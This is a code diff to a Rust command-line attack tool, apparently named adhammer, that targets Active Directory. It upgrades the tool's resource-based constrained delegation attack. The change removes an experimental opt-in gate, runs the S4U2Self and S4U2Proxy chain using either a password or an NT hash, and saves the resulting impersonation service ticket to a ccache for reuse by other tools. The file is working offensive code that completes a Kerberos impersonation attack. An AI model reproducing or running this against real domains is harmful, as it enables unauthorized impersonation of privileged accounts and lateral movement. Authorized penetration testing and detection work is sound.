@@ -2,7 +2,7 @@
 //! obtain an impersonation ticket to the target service.
 
 use crate::ui;
-use anyhow::Result;
+use anyhow::{Context, Result};
 use clap::Parser;
 
 #[derive(Parser)]
@@ -39,37 +39,31 @@ pub(crate) struct RbcdArgs {
     /// Target service SPN, e.g. cifs/dc01.corp.local
     #[arg(long)]
     pub target_spn: Option<String>,
+    /// 1.6.1: Output path for the impersonation ccache. Default:
+    /// `{impersonate}-{target_spn_basename}.ccache` in the current directory.
+    /// Refuses to overwrite an existing file to preserve prior attack evidence;
+    /// pass a different path or delete the old one to re-run.
+    #[arg(long, value_name = "PATH")]
+    pub out: Option<String>,
 }
 
 /// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
 ///
-/// 1.6.0 experimental gate: the S4U chain runs end-to-end and returns the final impersonation
-/// ticket's enctype as proof the chain completed, but the ticket itself is NOT yet persisted
-/// to a ccache usable by downstream tooling. A later 1.6.x release wires full ticket
-/// extraction + persistence. Until then, require operators to opt in explicitly via
-/// `ADHAMMER_EXPERIMENTAL=1` so nobody runs it against a production estate assuming they'll
-/// get a drop-in TGS back.
+/// 1.6.1: the chain now persists the final impersonation ticket to an MIT ccache
+/// via `kerbcore`-der + `adhammer_core::write_secret_artifact`. The 1.6.0
+/// `ADHAMMER_EXPERIMENTAL=1` gate was removed; this verb is now first-class.
 pub(crate) async fn rbcd(a: RbcdArgs) -> Result<()> {
-    if std::env::var("ADHAMMER_EXPERIMENTAL").ok().as_deref() != Some("1") {
-        anyhow::bail!(
-            "attack rbcd / attack constrained are EXPERIMENTAL in 1.6.0.\n\
-             \n\
-             What works: the S4U2Self + S4U2Proxy chain runs against the KDC and returns the\n\
-             final impersonation ticket's enctype (proof the chain completed).\n\
-             What's partial: the resulting service ticket is not yet written to a ccache\n\
-             usable by downstream tooling. Full transport lands in a future 1.6.x release.\n\
-             \n\
-             To run anyway (useful for KDC-side validation and detection-engineering tabletop):\n\
-             set ADHAMMER_EXPERIMENTAL=1 in the environment and re-run."
-        );
-    }
+    let out_override = a.out.clone();
     let cfg = match a.from_file.as_deref() {
         Some(p) => load_rbcd_ini(p)?.overlay(&a)?,
         None => RbcdConfig::from_flags(&a)?,
     };
-    let etype = match &cfg.credential {
+    // 1.6.1: full S4U chain + ticket persistence. The `*_ticket` variants in
+    // adhammer-kerberos return the full ServiceTicket; service_ticket_ccache
+    // serializes it into an MIT ccache usable with KRB5CCNAME.
+    let st = match &cfg.credential {
         TrusteeCredential::Password(pw) => {
-            adhammer_kerberos::rbcd_impersonate(
+            adhammer_kerberos::rbcd_impersonate_ticket(
                 &cfg.account,
                 pw.expose_secret(),
                 &cfg.realm,
@@ -80,7 +74,7 @@ pub(crate) async fn rbcd(a: RbcdArgs) -> Result<()> {
             .await?
         }
         TrusteeCredential::NtHash(nt) => {
-            adhammer_kerberos::rbcd_impersonate_by_hash(
+            adhammer_kerberos::rbcd_impersonate_by_hash_ticket(
                 &cfg.account,
                 nt,
                 &cfg.realm,
@@ -91,11 +85,41 @@ pub(crate) async fn rbcd(a: RbcdArgs) -> Result<()> {
             .await?
         }
     };
+    let etype = st.session_etype() as u32;
+    let bytes = adhammer_kerberos::service_ticket_ccache(
+        &st,
+        &cfg.impersonate,
+        &cfg.realm,
+        &cfg.target_spn,
+    )?;
+    // Default filename: `{impersonate}-{spn-basename}.ccache`. The SPN
+    // basename is the service component after the first `/`, flattened so
+    // the filename is shell-friendly.
+    let out_path = out_override.unwrap_or_else(|| {
+        let spn_slug = cfg
+            .target_spn
+            .replace(['/', ':'], "-")
+            .replace([' ', '\t'], "_");
+        format!("{}-{spn_slug}.ccache", cfg.impersonate)
+    });
+    // write_secret_artifact refuses to overwrite (same contract as attack
+    // asktgt). Operator deletes the prior ccache or passes `--out <path>` to
+    // land elsewhere.
+    adhammer_core::write_secret_artifact(
+        std::path::Path::new(&out_path),
+        adhammer_core::SecretArtifact::Ccache,
+        &bytes,
+    )
+    .with_context(|| format!("write impersonation ccache to {out_path}"))?;
     ui::ok(&format!(
-        "got service ticket for {} as {} (enc-part etype {etype})",
-        cfg.target_spn, cfg.impersonate
+        "got impersonation ticket for {} as {} (enc-part etype {etype}) → {out_path} ({} bytes)",
+        cfg.target_spn,
+        cfg.impersonate,
+        bytes.len()
     ));
-    println!("    RBCD chain succeeded — impersonation ticket obtained.");
+    println!(
+        "    S4U2Self + S4U2Proxy chain succeeded; ccache usable via KRB5CCNAME={out_path}"
+    );
     Ok(())
 }
 
